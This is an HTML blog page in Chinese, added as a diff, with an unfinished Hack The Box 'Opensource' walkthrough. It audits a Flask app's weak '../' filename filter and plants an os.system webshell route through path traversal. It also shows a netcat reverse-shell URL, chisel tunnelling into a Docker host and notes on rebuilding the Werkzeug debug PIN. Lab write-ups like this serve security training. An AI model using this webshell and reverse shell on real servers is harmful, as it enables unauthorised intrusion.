@@ -1,0 +1,154 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="ak"><meta name="renderer" content="webkit"><meta name="copyright" content="ak"><meta name="keywords" content="Ak4izZ'Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>htb-Opensource · Ak4izZ's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/me.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Ak4izZ</div><div class="profile-signature">fear is unreal</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">:&gt;#</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">htb-Opensource</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2022-07-07</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Flask"> Flask</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会</p>
+<span id="more"></span>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>开启了web服务</p>
+<p><img src="/2022/07/07/htb-Opensource/image-20220707200744923.png" alt="image-20220707200744923"></p>
+<p><img src="/2022/07/07/htb-Opensource/image-20220707200847525.png" alt="image-20220707200847525"></p>
+<p>来到网站，有一个地方下载源码，另一个跳转到上传页面。</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>解压打开文件，这是一个flask搭建的平台。</p>
+<p>在utils.py中，发现了过滤文件名的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">current_milli_time</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Pass filename and return a secure version, which can then safely be stored on a regular file system.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_name</span>(<span class="params">unsafe_filename</span>):</span><br><span class="line">    <span class="keyword">return</span> recursive_replace(unsafe_filename, <span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">TODO: get unique filename</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unique_upload_name</span>(<span class="params">unsafe_filename</span>):</span><br><span class="line">    spl = unsafe_filename.rsplit(<span class="string">&quot;\\.&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    file_name = spl[<span class="number">0</span>]</span><br><span class="line">    file_extension = spl[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> recursive_replace(file_name, <span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(current_milli_time()) + <span class="string">&quot;.&quot;</span> + file_extension</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Recursively replace a pattern in a string</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_replace</span>(<span class="params">search, replace_me, with_me</span>):</span><br><span class="line">    <span class="keyword">if</span> replace_me <span class="keyword">not</span> <span class="keyword">in</span> search:</span><br><span class="line">        <span class="keyword">return</span> search</span><br><span class="line">    <span class="keyword">return</span> recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)</span><br></pre></td></tr></table></figure>
+
+<p>这意味着文件名中的 ..&#x2F;..&#x2F; 会被过滤掉，但是并不影响替换文件,在view中这行函数，然后上传view.py到..&#x2F;&#x2F;app&#x2F;app&#x2F;view.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exec&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">return</span> os.system(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/07/htb-Opensource/image-20220708111226138.png" alt="image-20220708111226138"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.11%201337%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/07/htb-Opensource/image-20220709163144003.png" alt="image-20220709163144003"></p>
+<p>这样就拿到了shell，不过这个机器有点奇怪，home目录和root目录下什么也没有</p>
+<p>通过搜索找到了<a target="_blank" rel="noopener" href="https://blog.csdn.net/mar_ljh/article/details/109011822">识别的方法</a>，原来这个东西是docker容器</p>
+<p><img src="/2022/07/07/htb-Opensource/image-20220709164551335.png" alt="image-20220709164551335"></p>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">先知社区：渗透测试之Docker逃逸</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/234771">chisel：一款快速稳定的隧道工具</a></p>
+<p>xray</p>
+<p>查看了一下ip,这个容器的ip是172.17.0.5&#x2F;16，因此猜测一下主机可能是172.17.0.1。对他进行端口扫描需要做一个端口转发。先在kali下载安装一个chisel，然后用python开一个http服务把安装包下载到容器里面。</p>
+<p>可能是有防火墙的原因，正向连接会被拒绝。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali: chisel server --reverse --port 1234</span><br><span class="line">docker: chisel client 10.10.14.34:1234 R:socks</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/07/htb-Opensource/image-20220710111639703.png" alt="image-20220710111639703"></p>
+<p>接下来配置一下proxychain，用它把kali流量全部从1234端口代理出去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">然后再最后一行加上chisel分配的端口；注意和上面设置的端口不同！</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描。很他妈奇怪，扫不到172.17.0.1:3000<img src="/2022/07/07/htb-Opensource/image-20220711175730172.png" alt="image-20220711175730172"></p>
+<p>傻卵，连不上，不做了。</p>
+<h2 id="PIN破解"><a href="#PIN破解" class="headerlink" title="PIN破解"></a>PIN破解</h2><p>如果上传文件名是空的话会触发debug</p>
+<p><img src="/2022/07/07/htb-Opensource/image-20220707230834759.png" alt="image-20220707230834759"></p>
+<p>那么我们直接访问&#x2F;console看看</p>
+<p><img src="/2022/07/07/htb-Opensource/image-20220707233559952.png" alt="image-20220707233559952"></p>
+<p>提示需要pin码，但是我没有。网上的方法是审计源码分析pin码的生成方法。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass">werkzeug-debug-console-bypass</a></p>
+<p>生成PIN码的值由六项组成：</p>
+<ul>
+<li>用户名</li>
+<li>flask.app(固定值)</li>
+<li>Flask(固定值)</li>
+<li>app.pyc: &#x2F;usr&#x2F;local&#x2F;python3.10&#x2F;site-packages&#x2F;flask&#x2F;app.p（报错信息中有）</li>
+<li>str(uuid.getnode())（mac地址） &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address 中</li>
+<li>get_machine_id() &#x2F;etc&#x2F;machine-id 中或 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 中的值 + &#x2F;proc&#x2F;self&#x2F;cgroup中的字符串</li>
+</ul>
+<p>最后两项需要借助LFI才能查看。</p>
+<p>而在源文件的config&#x2F;supervisord.conf下可以知道，用户名是root.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[supervisord]</span><br><span class="line">user=root</span><br><span class="line">nodaemon=true</span><br><span class="line">logfile=/dev/null</span><br><span class="line">logfile_maxbytes=0</span><br><span class="line">pidfile=/run/supervisord.pid</span><br><span class="line"></span><br><span class="line">[program:flask]</span><br><span class="line">command=python /app/run.py</span><br><span class="line">stdout_logfile=/dev/stdout</span><br><span class="line">stdout_logfile_maxbytes=0</span><br><span class="line">stderr_logfile=/dev/stderr</span><br><span class="line">stderr_logfile_maxbytes=0</span><br></pre></td></tr></table></figure>
+
+<p>在view中可以发现</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://example.com">ak</a></p><p> <span>Link:  </span><a href="http://example.com/2022/07/07/htb-Opensource/">http://example.com/2022/07/07/htb-Opensource/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2022/07/17/xss-lab-level-1-14/" title="xss-lab_level_1-14"><span>< PreviousPost</span><br><span class="prevTitle">xss-lab_level_1-14</span></a><a class="nextSlogan" href="/2022/06/29/HTB-Timing/" title="HTB-Timing"><span>NextPost ></span><br><span class="nextTitle">HTB-Timing</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">3.1.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.2.</span> <span class="toc-text">端口转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIN%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">PIN破解</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
